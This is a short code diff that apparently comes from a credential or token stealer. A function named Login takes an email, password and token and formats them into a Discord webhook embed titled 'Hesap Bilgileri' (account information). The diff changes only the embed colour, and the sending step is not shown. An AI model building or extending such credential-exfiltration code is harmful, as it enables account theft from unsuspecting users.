@@ -149,7 +149,7 @@ function Login(email, password, token) {
             avatar_url: "https://media.discordapp.net/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
             embeds: [
                 {
-                    "color": 16777216,
+                    "color": 16507654,
                     "fields": [
                         {
                             "name": "**Hesap Bilgileri**",
